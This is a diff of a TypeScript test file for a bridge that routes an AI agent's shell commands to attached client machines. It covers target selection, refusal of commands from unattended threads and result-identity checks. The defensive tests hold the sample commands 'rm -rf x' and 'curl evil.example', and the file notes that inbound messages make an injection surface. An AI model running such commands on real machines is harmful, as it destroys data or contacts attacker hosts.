@@ -1,401 +1,428 @@
 import { describe, expect, it } from "vitest"
-import {
-  capabilityRoots,
-  createLocalShellBridge,
-} from "../src/local-shell-bridge.js"
-import type { LocalShellCapabilityFrame } from "../src/protocol.js"
+import { createLocalShellBridge } from "../src/local-shell-bridge.js"
+import type {
+  LocalShellCapabilityFrame,
+  LocalShellResultFrame,
+} from "../src/protocol.js"
 
-const baseCapability = (
-  extra: Partial<LocalShellCapabilityFrame>,
+/** A complete capability frame. Every field below is required by the protocol. */
+const cap = (
+  extra: Partial<LocalShellCapabilityFrame> = {},
 ): LocalShellCapabilityFrame => ({
   type: "local-shell-capability",
-  threadId: "thr_1",
   enabled: true,
+  approvalMode: "auto",
   clientId: "cli_1",
+  label: "laptop",
+  sandbox: false,
   platform: "darwin",
   cwd: "/work",
+  roots: ["/work"],
+  fullAccess: false,
   ...extra,
 })
 
-describe("capabilityRoots", () => {
-  it("reads a LEGACY (roots-absent) frame as a single-root [cwd] attachment", () => {
-    expect(capabilityRoots(baseCapability({ cwd: "/legacy" }))).toEqual({
-      roots: ["/legacy"],
-      fullAccess: false,
-    })
+const sandboxCap = (extra: Partial<LocalShellCapabilityFrame> = {}) =>
+  cap({
+    clientId: "server_sandbox",
+    label: "stable",
+    sandbox: true,
+    platform: "linux",
+    cwd: "/root/luna",
+    roots: ["/root/luna"],
+    ...extra,
   })
 
-  it("preserves an EMPTY roots list from a new client (opt-in auto-approval)", () => {
-    expect(capabilityRoots(baseCapability({ roots: [], cwd: "/launch" }))).toEqual({
-      roots: [],
-      fullAccess: false,
-    })
-  })
-
-  it("passes through attached roots and the fullAccess flag", () => {
-    expect(
-      capabilityRoots(
-        baseCapability({ roots: ["/a", "/b"], fullAccess: true, cwd: "/a" }),
-      ),
-    ).toEqual({ roots: ["/a", "/b"], fullAccess: true })
-  })
+const result = (
+  requestId: string,
+  clientId: string,
+  extra: Partial<LocalShellResultFrame> = {},
+): LocalShellResultFrame => ({
+  type: "local-shell-result",
+  requestId,
+  threadId: "thr_1",
+  clientId,
+  approved: true,
+  exitCode: 0,
+  stdout: "",
+  stderr: "",
+  durationMs: 1,
+  timedOut: false,
+  ...extra,
 })
 
+/** Pull the requestId out of whatever the bridge just sent a client. */
+const sentRequestId = (sent: ReadonlyArray<unknown>, i = 0): string =>
+  (sent[i] as { requestId: string }).requestId
+
 describe("local shell bridge", () => {
-  it("registers one client per thread", () => {
-    const bridge = createLocalShellBridge()
-    const first = bridge.setCapability(
-      {
-        type: "local-shell-capability",
-        threadId: "thr_1",
-        enabled: true,
-        clientId: "cli_1",
-        platform: "darwin",
-        cwd: "/work",
-      },
-      () => undefined,
-    )
-    const second = bridge.setCapability(
-      {
-        type: "local-shell-capability",
-        threadId: "thr_1",
-        enabled: true,
-        clientId: "cli_2",
-        platform: "linux",
-        cwd: "/work",
-      },
-      () => undefined,
-    )
+  describe("coexistence", () => {
+    it("lets two clients serve the same thread at once", () => {
+      const bridge = createLocalShellBridge()
+      const first = bridge.setCapability(cap(), () => undefined)
+      const second = bridge.setCapability(
+        cap({ clientId: "cli_2", label: "desktop" }),
+        () => undefined,
+      )
 
-    expect(first.accepted).toBe(true)
-    expect(second.accepted).toBe(false)
-    expect(second.message).toContain("already attached")
-  })
-
-  it("preserves approval mode on accepted capability", () => {
-    const bridge = createLocalShellBridge()
-    const accepted = bridge.setCapability(
-      {
-        type: "local-shell-capability",
-        threadId: "thread-1",
-        enabled: true,
-        clientId: "client-1",
-        platform: "linux",
-        cwd: "/root/luna",
-        approvalMode: "auto",
-      },
-      () => undefined,
-    )
-
-    expect(accepted.accepted).toBe(true)
-    expect(bridge.getCapability("thread-1")?.approvalMode).toBe("auto")
-  })
-
-  it("allows an explicit client to replace a replaceable sandbox binding", () => {
-    const bridge = createLocalShellBridge()
-    const sandbox = bridge.setCapability(
-      {
-        type: "local-shell-capability",
-        threadId: "thr_1",
-        enabled: true,
-        clientId: "server_sandbox_thr_1",
-        platform: "linux",
-        cwd: "/root/luna",
-        approvalMode: "auto",
-        replaceable: true,
-      },
-      () => undefined,
-    )
-    const client = bridge.setCapability(
-      {
-        type: "local-shell-capability",
-        threadId: "thr_1",
-        enabled: true,
-        clientId: "cli_1",
-        platform: "darwin",
-        cwd: "/home/user/luna",
-        approvalMode: "prompt",
-      },
-      () => undefined,
-    )
-
-    expect(sandbox.accepted).toBe(true)
-    expect(client.accepted).toBe(true)
-    expect(bridge.getCapability("thr_1")?.clientId).toBe("cli_1")
-  })
-
-  it("removes a client when capability is disabled", () => {
-    const bridge = createLocalShellBridge()
-    bridge.setCapability(
-      {
-        type: "local-shell-capability",
-        threadId: "thr_1",
-        enabled: true,
-        clientId: "cli_1",
-        platform: "darwin",
-        cwd: "/work",
-      },
-      () => undefined,
-    )
-    bridge.setCapability(
-      {
-        type: "local-shell-capability",
-        threadId: "thr_1",
-        enabled: false,
-        clientId: "cli_1",
-        platform: "darwin",
-        cwd: "/work",
-      },
-      () => undefined,
-    )
-
-    expect(bridge.getCapability("thr_1")).toBeNull()
-  })
-
-  it("resolves request when result arrives", async () => {
-    const bridge = createLocalShellBridge()
-    const sent: unknown[] = []
-    bridge.setCapability(
-      {
-        type: "local-shell-capability",
-        threadId: "thr_1",
-        enabled: true,
-        clientId: "cli_1",
-        platform: "darwin",
-        cwd: "/work",
-      },
-      (frame) => sent.push(frame),
-    )
-
-    const pending = bridge.request({
-      threadId: "thr_1",
-      command: "pwd",
-      timeoutMs: 2_000,
-    })
-    expect(sent).toHaveLength(1)
-    const req = sent[0] as { requestId: string }
-    bridge.acceptResult({
-      type: "local-shell-result",
-      requestId: req.requestId,
-      threadId: "thr_1",
-      approved: true,
-      exitCode: 0,
-      stdout: "/work",
-      stderr: "",
-      durationMs: 3,
-      timedOut: false,
+      // Neither registration displaces the other: this is the whole change.
+      expect(first.accepted).toBe(true)
+      expect(second.accepted).toBe(true)
+      expect(bridge.listTargets().map((t) => t.label)).toEqual([
+        "desktop",
+        "laptop",
+      ])
     })
 
-    await expect(pending).resolves.toMatchObject({
-      result: { stdout: "/work", exitCode: 0 },
+    it("refreshes a client in place when it re-registers", () => {
+      const bridge = createLocalShellBridge()
+      bridge.setCapability(cap({ roots: ["/old"] }), () => undefined)
+      bridge.setCapability(cap({ roots: ["/new"] }), () => undefined)
+
+      const targets = bridge.listTargets()
+      expect(targets).toHaveLength(1)
+      expect(targets[0]?.roots).toEqual(["/new"])
+    })
+
+    it("removes only the client that disabled itself", () => {
+      const bridge = createLocalShellBridge()
+      bridge.setCapability(cap(), () => undefined)
+      bridge.setCapability(sandboxCap(), () => undefined)
+
+      bridge.setCapability(cap({ enabled: false }), () => undefined)
+
+      expect(bridge.listTargets().map((t) => t.label)).toEqual(["stable"])
+    })
+
+    it("reports each target's scope", () => {
+      const bridge = createLocalShellBridge()
+      bridge.setCapability(
+        cap({ roots: ["/a", "/b"], fullAccess: true }),
+        () => undefined,
+      )
+
+      expect(bridge.listTargets()[0]).toEqual({
+        label: "laptop",
+        clientId: "cli_1",
+        platform: "darwin",
+        cwd: "/work",
+        roots: ["/a", "/b"],
+        fullAccess: true,
+        sandbox: false,
+      })
     })
   })
 
-  it("reports the identity of the client that served the request", async () => {
-    const bridge = createLocalShellBridge()
-    const sent: unknown[] = []
-    bridge.setCapability(
-      {
-        type: "local-shell-capability",
+  describe("target selection", () => {
+    it("selects a target by label, case-insensitively", async () => {
+      const bridge = createLocalShellBridge()
+      const toLaptop: unknown[] = []
+      const toSandbox: unknown[] = []
+      bridge.setCapability(cap(), (f) => toLaptop.push(f))
+      bridge.setCapability(sandboxCap(), (f) => toSandbox.push(f))
+
+      const pending = bridge.request({
         threadId: "thr_1",
-        enabled: true,
-        clientId: "cli_mac",
+        command: "hostname",
+        timeoutMs: 2_000,
+        target: "STABLE",
+      })
+
+      expect(toLaptop).toHaveLength(0)
+      expect(toSandbox).toHaveLength(1)
+      bridge.acceptResult(
+        result(sentRequestId(toSandbox), "server_sandbox"),
+        "server_sandbox",
+      )
+      expect((await pending).dispatchedTo.label).toBe("stable")
+    })
+
+    it("refuses to guess when more than one target is attached", async () => {
+      const bridge = createLocalShellBridge()
+      const sent: unknown[] = []
+      bridge.setCapability(cap(), (f) => sent.push(f))
+      bridge.setCapability(sandboxCap(), (f) => sent.push(f))
+
+      // No implicit default. Picking for the caller is how a destructive
+      // command lands on the wrong machine.
+      await expect(
+        bridge.request({ threadId: "thr_1", command: "rm -rf x", timeoutMs: 10 }),
+      ).rejects.toThrow(/2 targets attached \(laptop, stable\); pass "target"/)
+      expect(sent).toHaveLength(0)
+    })
+
+    it("refuses a target that is not attached instead of falling back", async () => {
+      const bridge = createLocalShellBridge()
+      const sent: unknown[] = []
+      bridge.setCapability(cap(), (f) => sent.push(f))
+
+      await expect(
+        bridge.request({
+          threadId: "thr_1",
+          command: "whoami",
+          timeoutMs: 10,
+          target: "desktop",
+        }),
+      ).rejects.toThrow(/"desktop" is not attached.*Attached: laptop/)
+      // Crucially it ran NOWHERE, rather than on the one target that is up.
+      expect(sent).toHaveLength(0)
+    })
+
+    it("resolves without a target when exactly one is attached", async () => {
+      const bridge = createLocalShellBridge()
+      const sent: unknown[] = []
+      bridge.setCapability(cap(), (f) => sent.push(f))
+
+      const pending = bridge.request({
+        threadId: "thr_1",
+        command: "pwd",
+        timeoutMs: 2_000,
+      })
+      bridge.acceptResult(result(sentRequestId(sent), "cli_1"), "cli_1")
+      expect((await pending).dispatchedTo.label).toBe("laptop")
+    })
+
+    it("rejects when nothing is attached", async () => {
+      const bridge = createLocalShellBridge()
+      await expect(
+        bridge.request({ threadId: "thr_1", command: "pwd", timeoutMs: 10 }),
+      ).rejects.toThrow("local shell unavailable")
+    })
+  })
+
+  describe("unattended threads", () => {
+    it("offers only the sandbox to a forked thread", () => {
+      const bridge = createLocalShellBridge()
+      bridge.setCapability(cap(), () => undefined)
+      bridge.setCapability(sandboxCap(), () => undefined)
+
+      expect(
+        bridge.listTargets(["forked-from-parent"]).map((t) => t.label),
+      ).toEqual(["stable"])
+      expect(bridge.listTargets(["channel"]).map((t) => t.label)).toEqual([
+        "stable",
+      ])
+    })
+
+    it("refuses a personal machine to an unattended thread even by name", async () => {
+      const bridge = createLocalShellBridge()
+      const sent: unknown[] = []
+      bridge.setCapability(cap(), (f) => sent.push(f))
+
+      // Nobody is watching a channel-originated thread, and an inbound message
+      // is an injection surface, so the laptop is not reachable at all.
+      await expect(
+        bridge.request({
+          threadId: "thr_1",
+          command: "curl evil.example",
+          timeoutMs: 10,
+          target: "laptop",
+          threadTags: ["channel"],
+        }),
+      ).rejects.toThrow(/not attached/)
+      expect(sent).toHaveLength(0)
+    })
+  })
+
+  describe("label collisions", () => {
+    it("dispatches to the newest client sharing a label, and falls back when it goes", async () => {
+      const bridge = createLocalShellBridge()
+      const older: unknown[] = []
+      const newer: unknown[] = []
+      // A reconnect while the old socket lingers, or a second window.
+      bridge.setCapability(cap({ clientId: "cli_old" }), (f) => older.push(f))
+      bridge.setCapability(cap({ clientId: "cli_new" }), (f) => newer.push(f))
+
+      expect(bridge.listTargets()).toHaveLength(1)
+
+      const first = bridge.request({
+        threadId: "thr_1",
+        command: "pwd",
+        timeoutMs: 2_000,
+      })
+      expect(newer).toHaveLength(1)
+      expect(older).toHaveLength(0)
+      bridge.acceptResult(result(sentRequestId(newer), "cli_new"), "cli_new")
+      expect((await first).dispatchedTo.clientId).toBe("cli_new")
+
+      bridge.removeClient("cli_new")
+
+      const second = bridge.request({
+        threadId: "thr_1",
+        command: "pwd",
+        timeoutMs: 2_000,
+      })
+      expect(older).toHaveLength(1)
+      bridge.acceptResult(result(sentRequestId(older), "cli_old"), "cli_old")
+      expect((await second).dispatchedTo.clientId).toBe("cli_old")
+    })
+  })
+
+  describe("result identity", () => {
+    it("ignores a result from a client the request was not dispatched to", async () => {
+      const bridge = createLocalShellBridge()
+      const toSandbox: unknown[] = []
+      bridge.setCapability(cap(), () => undefined)
+      bridge.setCapability(sandboxCap(), (f) => toSandbox.push(f))
+
+      const pending = bridge.request({
+        threadId: "thr_1",
+        command: "hostname",
+        timeoutMs: 2_000,
+        target: "stable",
+      })
+      const requestId = sentRequestId(toSandbox)
+
+      // The laptop answers the sandbox's pending command. With several machines
+      // attached this is the confused-deputy case; it must not resolve.
+      bridge.acceptResult(result(requestId, "cli_1"), "cli_1")
+
+      let settled = false
+      void pending.then(
+        () => {
+          settled = true
+        },
+        () => {
+          settled = true
+        },
+      )
+      await new Promise((r) => setTimeout(r, 20))
+      expect(settled).toBe(false)
+
+      bridge.acceptResult(
+        result(requestId, "server_sandbox", { stdout: "luna-stable" }),
+        "server_sandbox",
+      )
+      expect((await pending).result.stdout).toBe("luna-stable")
+    })
+
+    it("reports the identity that served the request", async () => {
+      const bridge = createLocalShellBridge()
+      const sent: unknown[] = []
+      bridge.setCapability(
+        cap({ roots: ["/work", "/tmp"] }),
+        (f) => sent.push(f),
+      )
+
+      const pending = bridge.request({
+        threadId: "thr_1",
+        command: "pwd",
+        timeoutMs: 2_000,
+      })
+      bridge.acceptResult(result(sentRequestId(sent), "cli_1"), "cli_1")
+
+      expect((await pending).dispatchedTo).toEqual({
+        clientId: "cli_1",
+        label: "laptop",
         platform: "darwin",
         cwd: "/work",
         roots: ["/work", "/tmp"],
         fullAccess: false,
-      },
-      (frame) => sent.push(frame),
-    )
-
-    const pending = bridge.request({
-      threadId: "thr_1",
-      command: "pwd",
-      timeoutMs: 2_000,
-    })
-    const req = sent[0] as { requestId: string }
-    bridge.acceptResult({
-      type: "local-shell-result",
-      requestId: req.requestId,
-      threadId: "thr_1",
-      approved: true,
-      exitCode: 0,
-      stdout: "/work",
-      stderr: "",
-      durationMs: 3,
-      timedOut: false,
+        sandbox: false,
+      })
     })
 
-    const outcome = await pending
-    expect(outcome.dispatchedTo).toEqual({
-      clientId: "cli_mac",
-      platform: "darwin",
-      cwd: "/work",
-      roots: ["/work", "/tmp"],
-      fullAccess: false,
+    it("reports the request's own cwd as the effective cwd", async () => {
+      const bridge = createLocalShellBridge()
+      const sent: unknown[] = []
+      bridge.setCapability(sandboxCap(), (f) => sent.push(f))
+
+      const pending = bridge.request({
+        threadId: "thr_1",
+        command: "pwd",
+        cwd: "/root/luna/worktrees/x",
+        timeoutMs: 2_000,
+      })
+      bridge.acceptResult(
+        result(sentRequestId(sent), "server_sandbox"),
+        "server_sandbox",
+      )
+
+      const { dispatchedTo } = await pending
+      expect(dispatchedTo.cwd).toBe("/root/luna/worktrees/x")
+      expect(dispatchedTo.sandbox).toBe(true)
+    })
+
+    it("snapshots dispatch identity so a later registration cannot rewrite it", async () => {
+      const bridge = createLocalShellBridge()
+      const sent: unknown[] = []
+      bridge.setCapability(sandboxCap(), (f) => sent.push(f))
+
+      const pending = bridge.request({
+        threadId: "thr_1",
+        command: "hostname",
+        timeoutMs: 2_000,
+      })
+      const requestId = sentRequestId(sent)
+
+      // Another machine attaches while the command is still in flight.
+      bridge.setCapability(cap(), () => undefined)
+      expect(bridge.listTargets()).toHaveLength(2)
+
+      bridge.acceptResult(
+        result(requestId, "server_sandbox", { stdout: "luna-stable" }),
+        "server_sandbox",
+      )
+
+      // The result names who it was SENT to, not who is attached now.
+      const { dispatchedTo } = await pending
+      expect(dispatchedTo.clientId).toBe("server_sandbox")
+      expect(dispatchedTo.platform).toBe("linux")
     })
   })
 
-  it("reports the request's own cwd as the effective cwd", async () => {
-    const bridge = createLocalShellBridge()
-    const sent: unknown[] = []
-    bridge.setCapability(
-      {
-        type: "local-shell-capability",
+  describe("pending request lifecycle", () => {
+    it("rejects a pending request when its client is removed", async () => {
+      const bridge = createLocalShellBridge()
+      bridge.setCapability(cap(), () => undefined)
+      const pending = bridge.request({
         threadId: "thr_1",
-        enabled: true,
-        clientId: "cli_1",
-        platform: "linux",
-        cwd: "/root/luna",
-        fullAccess: true,
-      },
-      (frame) => sent.push(frame),
-    )
-
-    const pending = bridge.request({
-      threadId: "thr_1",
-      command: "pwd",
-      cwd: "/root/luna/worktrees/x",
-      timeoutMs: 2_000,
-    })
-    const req = sent[0] as { requestId: string }
-    bridge.acceptResult({
-      type: "local-shell-result",
-      requestId: req.requestId,
-      threadId: "thr_1",
-      approved: true,
-      exitCode: 0,
-      stdout: "",
-      stderr: "",
-      durationMs: 1,
-      timedOut: false,
+        command: "sleep 5",
+        timeoutMs: 5_000,
+      })
+      bridge.removeClient("cli_1")
+      await expect(pending).rejects.toThrow("local shell client removed")
     })
 
-    const outcome = await pending
-    expect(outcome.dispatchedTo.cwd).toBe("/root/luna/worktrees/x")
-    expect(outcome.dispatchedTo.platform).toBe("linux")
-  })
-
-  it("snapshots dispatch identity so a mid-flight rebind cannot rewrite it", async () => {
-    // The whole point of the field: the binding can be replaced while a
-    // command is in flight. The result must name the client it was SENT to,
-    // not whoever happens to hold the slot when the result lands.
-    const bridge = createLocalShellBridge()
-    const sent: unknown[] = []
-    bridge.setCapability(
-      {
-        type: "local-shell-capability",
+    it("rejects a pending request when its client disables itself", async () => {
+      const bridge = createLocalShellBridge()
+      bridge.setCapability(cap(), () => undefined)
+      const pending = bridge.request({
         threadId: "thr_1",
-        enabled: true,
-        clientId: "server_sandbox_thr_1",
-        platform: "linux",
-        cwd: "/root/luna",
-        replaceable: true,
-      },
-      (frame) => sent.push(frame),
-    )
-
-    const pending = bridge.request({
-      threadId: "thr_1",
-      command: "hostname",
-      timeoutMs: 2_000,
-    })
-    const req = sent[0] as { requestId: string }
-
-    // A second client takes the slot before the result comes back.
-    bridge.setCapability(
-      {
-        type: "local-shell-capability",
-        threadId: "thr_1",
-        enabled: true,
-        clientId: "cli_mac",
-        platform: "darwin",
-        cwd: "/Users/sterling",
-      },
-      () => {},
-    )
-    expect(bridge.getCapability("thr_1")?.clientId).toBe("cli_mac")
-
-    bridge.acceptResult({
-      type: "local-shell-result",
-      requestId: req.requestId,
-      threadId: "thr_1",
-      approved: true,
-      exitCode: 0,
-      stdout: "luna-stable",
-      stderr: "",
-      durationMs: 2,
-      timedOut: false,
+        command: "sleep 5",
+        timeoutMs: 5_000,
+      })
+      bridge.setCapability(cap({ enabled: false }), () => undefined)
+      await expect(pending).rejects.toThrow("local shell disabled")
     })
 
-    const outcome = await pending
-    expect(outcome.dispatchedTo.clientId).toBe("server_sandbox_thr_1")
-    expect(outcome.dispatchedTo.platform).toBe("linux")
-  })
+    it("leaves another client's pending request alone when one client goes", async () => {
+      const bridge = createLocalShellBridge()
+      const toSandbox: unknown[] = []
+      bridge.setCapability(cap(), () => undefined)
+      bridge.setCapability(sandboxCap(), (f) => toSandbox.push(f))
 
-  it("rejects request when no client is enabled", async () => {
-    const bridge = createLocalShellBridge()
-
-    await expect(
-      bridge.request({ threadId: "thr_1", command: "pwd", timeoutMs: 10 }),
-    ).rejects.toThrow("local shell unavailable")
-  })
-
-  it("rejects pending request when client is removed", async () => {
-    const bridge = createLocalShellBridge()
-    bridge.setCapability(
-      {
-        type: "local-shell-capability",
+      const pending = bridge.request({
         threadId: "thr_1",
-        enabled: true,
-        clientId: "cli_1",
-        platform: "darwin",
-        cwd: "/work",
-      },
-      () => undefined,
-    )
+        command: "sleep 5",
+        timeoutMs: 5_000,
+        target: "stable",
+      })
+      bridge.removeClient("cli_1")
 
-    const pending = bridge.request({
-      threadId: "thr_1",
-      command: "pwd",
-      timeoutMs: 2_000,
+      bridge.acceptResult(
+        result(sentRequestId(toSandbox), "server_sandbox", { stdout: "ok" }),
+        "server_sandbox",
+      )
+      expect((await pending).result.stdout).toBe("ok")
     })
-    bridge.removeClient("cli_1")
 
-    await expect(pending).rejects.toThrow("local shell client removed")
-  })
-
-  it("rejects pending request when capability is disabled", async () => {
-    const bridge = createLocalShellBridge()
-    bridge.setCapability(
-      {
-        type: "local-shell-capability",
-        threadId: "thr_1",
-        enabled: true,
-        clientId: "cli_1",
-        platform: "darwin",
-        cwd: "/work",
-      },
-      () => undefined,
-    )
-
-    const pending = bridge.request({
-      threadId: "thr_1",
-      command: "pwd",
-      timeoutMs: 2_000,
+    it("rejects when the request times out", async () => {
+      const bridge = createLocalShellBridge()
+      bridge.setCapability(cap(), () => undefined)
+      await expect(
+        bridge.request({ threadId: "thr_1", command: "sleep 5", timeoutMs: 5 }),
+      ).rejects.toThrow("local shell request timed out")
     })
-    bridge.setCapability(
-      {
-        type: "local-shell-capability",
-        threadId: "thr_1",
-        enabled: false,
-        clientId: "cli_1",
-        platform: "darwin",
-        cwd: "/work",
-      },
-      () => undefined,
-    )
-
-    await expect(pending).rejects.toThrow("local shell disabled")
   })
 })
